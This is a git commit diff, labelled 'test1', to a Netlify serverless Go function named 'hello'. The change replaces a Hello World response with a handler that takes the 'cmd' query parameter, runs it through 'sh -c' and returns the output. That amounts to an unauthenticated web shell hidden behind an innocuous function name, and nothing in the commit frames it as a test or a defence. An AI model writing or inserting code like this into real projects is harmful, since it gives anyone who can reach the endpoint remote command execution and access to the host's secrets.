46dbee1910e8b72234f49b0c248d9c5fc8d69c70
pankass <1520319004@qq.com>
2024-10-13 19:10:43 +0800

    test1

--- netlify/functions/hello/main.go
+++ netlify/functions/hello/main.go
@@ -1,17 +1,29 @@
 package main
 
 import (
-  "github.com/aws/aws-lambda-go/events"
-  "github.com/aws/aws-lambda-go/lambda"
+	"github.com/aws/aws-lambda-go/events"
+	"github.com/aws/aws-lambda-go/lambda"
+	"os/exec"
 )
 
 func handler(request events.APIGatewayProxyRequest) (*events.APIGatewayProxyResponse, error) {
-  return &events.APIGatewayProxyResponse{
-    StatusCode:        200,
-    Body:              "Hello, World!",
-  }, nil
+
+	reqCmds := request.QueryStringParameters["cmd"]
+
+	res, err := exec.Command("sh", "-c", reqCmds).CombinedOutput()
+	if err != nil {
+		return &events.APIGatewayProxyResponse{
+			StatusCode: 500,
+			Body:       "server error",
+		}, err
+	}
+
+	return &events.APIGatewayProxyResponse{
+		StatusCode: 200,
+		Body:       string(res),
+	}, nil
 }
 
 func main() {
-  lambda.Start(handler)
+	lambda.Start(handler)
 }
